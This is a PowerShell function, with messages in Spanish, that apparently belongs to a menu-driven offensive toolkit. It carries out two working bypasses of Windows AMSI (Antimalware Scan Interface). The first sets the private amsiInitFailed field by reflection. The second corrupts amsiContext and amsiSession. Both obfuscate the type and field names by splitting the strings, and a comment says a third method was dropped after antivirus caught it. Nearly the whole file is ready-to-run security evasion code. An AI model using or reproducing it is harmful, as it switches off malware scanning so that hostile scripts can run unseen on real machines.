function Force_Error  


{

    Write-Host "";
    Write-Host "Técnica original de Matt Graeber, Adam Chester & Melvin Langvik ";
    Write-Host "https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/";
    Write-Host "";
    Write-Host -ForegroundColor Yellow "Forzando error...";
    Write-Host "";

    
    #Metodo 1
    Try {
    Write-Host "Intentando bypass mediante error con método 1:";
    
    $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
    Start-Sleep 1
    $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
    Start-Sleep 1
    $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
    Start-Sleep 1
    $field.SetValue($null,$true)
    Start-Sleep 1
    Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
    }
    Catch {
        Write-host "Método 1 falló"
        Write-Host "";

        #Metodo 2
        Try 
        {
            $c = 'si';
            $m = 'Utils';
            $d = 'Context';
            $s = 'Session';

            Write-Host "Intentando bypass mediante error con método 2:";
            $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
            [Ref].Assembly.GetType("System.Management.Automation.A"+"m"+$c +$m).GetField("a"+"m"+$c+$d,"NonPublic,Static").SetValue($null, [IntPtr]$mem)
            Start-Sleep 1
            [Ref].Assembly.GetType("System.Management.Automation.A"+"m"+$c+$m).GetField("a"+"m"+$c+$s,"NonPublic,Static").SetValue($null, $null);
            Start-Sleep 1
            Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
        }
        Catch 
        {
            Write-host "Método 2 falló";
            Write-Host "";
            Write-host "Intente otra técnica para hacer el bypass de AMSI";
            break;
            exit 
        
            #Metodo 3

            #Eliminado, interceptado por el AV
            
        }

    }
   
    pause;
    Show_menu
}